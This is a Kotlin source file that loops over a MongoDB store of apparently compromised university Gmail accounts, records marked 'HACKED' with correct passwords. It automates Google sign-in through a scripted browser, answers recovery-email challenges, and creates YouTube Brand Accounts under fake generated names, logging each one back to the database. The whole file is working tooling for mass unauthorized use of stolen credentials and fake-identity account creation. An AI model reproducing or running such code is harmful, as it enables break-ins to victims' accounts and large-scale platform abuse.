package net.scr0pt.thirdservice.google

import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.crawl.school.random
import net.scr0pt.thirdservice.mongodb.MongoConnection
import net.scr0pt.utils.FakeProfileV2
import net.scr0pt.utils.RobotManager
import org.bson.Document

/**
 * Created by Long
 * Date: 11/9/2019
 * Time: 2:33 PM
 */

fun main() {
    val mongoClient = MongoClients.create(MongoConnection.eduConnection)
    val accountDatabase = mongoClient.getDatabase("edu-school-account")
    val eduCollection = accountDatabase.getCollection("vimaru-email-info")

    while (true) {
        val doc = eduCollection.random(Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))
        if (doc != null && doc.containsKey("Allow less secure apps")) {
            val gmailUsername = doc.getString("email")
            val recoverEmail: String? = doc.getString("recover_email")
            val gmailPassword = doc.getString("new_pass") ?: doc.getString("pass")
            run(gmailUsername, gmailPassword, recoverEmail, eduCollection)
        }
    }
}

fun run(gmailUsername: String, gmailPassword: String, recoverEmail: String?, eduCollection: MongoCollection<Document>) {
    println(gmailUsername + " | " + gmailPassword)
    val startTime = System.currentTimeMillis()
    val brandAcc = BrandAcc()
    brandAcc.loginGoogle(gmailUsername, gmailPassword, recoverEmail) {
        brandAcc.createNewBrandAcc(eduCollection, gmailUsername)
        val endTime = System.currentTimeMillis()
        println("It takes ${(endTime - startTime) / 1000} seconds")
    }
}

class BrandAcc {
    val robotManager = RobotManager(browerType = RobotManager.BrowserType.CHROME_INCOGNITO)

    init {
        robotManager.openBrowser()
        for (i in 0..20) {
            if (robotManager.isInputReady()) break
        }
    }

    fun loginGoogle(email: String, password: String, recoverEmail: String?, onSuccess: (() -> Unit)? = null) {
        with(robotManager) {
            browserGoTo("https://accounts.google.com/signin/v2/identifier?hl=en&passive=true&continue=https%3A%2F%2Fwww.google.com%2F%3Fgfe_rd%3Dcr%26ei%3D-PRMWN2HKeHC8AfwyapQ%26gws_rd%3Dcr%26fg%3D1&flowName=GlifWebSignIn&flowEntry=ServiceLogin")
            for (i in 0..20) {
                if (isInputReady()) break
            }
            clearAndPasteInput(email)
            enter()
            clearAndPasteInput(password)
            enter()

            waiting(onSuccess, recoverEmail)
        }
    }

    private fun RobotManager.waiting(onSuccess: (() -> Unit)? = null, recoverEmail: String?) {
        do {
            sleep()
            val currentUrl = getCurrentUrl()
            if (currentUrl.startsWith(GoogleConstants.protectYourAccount) || currentUrl.startsWith(GoogleConstants.googleSearch)) {
                onSuccess?.invoke()
                break
            } else if (currentUrl.startsWith(GoogleConstants.recoverEmailLoginVerify)) {
                val recoverEmailInputPosition = Pair<Int, Int>(665, 504)
                click(recoverEmailInputPosition)
                if (recoverEmail != null) {
                    clearAndPasteInput(recoverEmail)
                    enter()
                    waiting(onSuccess, recoverEmail)
                }
                break
            } else if (currentUrl.startsWith(GoogleConstants.phoneNumberLoginVerify)) {
                closeWindow()
                break
            } else if (currentUrl == GoogleConstants.PlusPageSignUpIdvChallenge) {
                closeWindow()
                break
            }
        } while (true)
    }

    fun createNewBrandAcc(eduCollection: MongoCollection<Document>, gmailUsername: String, onSuccess: (() -> Unit)? = null) {
        val profile = FakeProfileV2.getNewProfile()
        if (profile == null) {
            createNewBrandAcc(eduCollection, gmailUsername)
            return
        }
        val name = profile.fullname
        val inputPosition = Pair<Int, Int>(688, 444)
        val createBtnPosition = Pair<Int, Int>(485, 513)

        with(robotManager) {
            browserGoTo("https://www.youtube.com/create_channel?action_create_new_channel_redirect=true")

            for (i in 0..20) {
                val text = getScreenText()
                if (text.contains("Để tạo kênh mới, tạo một Tài khoản thương hiệu")
                        || text.contains("To create a new channel, create a Brand Account"))
                    break
            }

            click(inputPosition)
            clearAndPasteInput(name)
            click(createBtnPosition)

            waitUntilUrlStartWith("https://www.youtube.com/channel/")
            closeWindow()
            eduCollection.updateOne(
                    Document("email", gmailUsername),
                    Updates.push("brand_acc", name)
            )
            onSuccess?.invoke()
        }
    }
}
